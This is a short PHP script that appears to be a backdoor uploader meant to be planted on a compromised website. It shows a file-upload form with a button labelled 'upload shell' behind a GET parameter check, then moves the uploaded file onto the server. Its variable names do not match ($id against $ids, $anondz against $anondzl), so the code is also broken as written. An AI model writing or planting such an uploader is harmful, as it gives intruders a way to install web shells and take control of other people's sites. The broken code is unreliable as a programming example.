
<?php
$id = $_GET['id'];
if($ids == 'dz'){
$anondz = $_FILES['file']['name'];
$anonymousdz = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($anonymousdz,$anondzl);
}
?>
